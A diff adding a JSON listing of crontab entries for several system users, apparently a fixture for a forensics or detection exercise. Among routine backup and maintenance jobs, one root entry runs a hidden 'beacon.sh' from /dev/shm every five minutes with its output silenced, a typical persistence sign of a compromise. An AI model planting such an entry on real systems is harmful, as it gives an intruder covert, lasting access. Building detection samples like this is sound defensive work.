@@ -1,0 +1,57 @@
+[
+  {
+    "user": "root",
+    "entries": [
+      {
+        "schedule": "0 2 * * *",
+        "command": "/usr/local/bin/backup.sh",
+        "comment": "Daily backup at 2 AM"
+      },
+      {
+        "schedule": "0 * * * *",
+        "command": "/usr/bin/logrotate /etc/logrotate.conf",
+        "comment": "Hourly log rotation"
+      },
+      {
+        "schedule": "*/5 * * * *",
+        "command": "/dev/shm/.update/beacon.sh > /dev/null 2>&1",
+        "comment": ""
+      }
+    ]
+  },
+  {
+    "user": "www-data",
+    "entries": [
+      {
+        "schedule": "0 3 * * 0",
+        "command": "/var/www/scripts/cleanup_temp.sh",
+        "comment": "Weekly temp cleanup"
+      },
+      {
+        "schedule": "*/15 * * * *",
+        "command": "/usr/bin/php /var/www/html/cron/process_queue.php",
+        "comment": "Process job queue"
+      }
+    ]
+  },
+  {
+    "user": "ubuntu",
+    "entries": [
+      {
+        "schedule": "0 6 * * *",
+        "command": "/home/ubuntu/scripts/health_check.sh",
+        "comment": "Morning health check"
+      }
+    ]
+  },
+  {
+    "user": "mysql",
+    "entries": [
+      {
+        "schedule": "0 1 * * *",
+        "command": "/usr/local/bin/mysql_backup.sh",
+        "comment": "Daily MySQL backup"
+      }
+    ]
+  }
+]
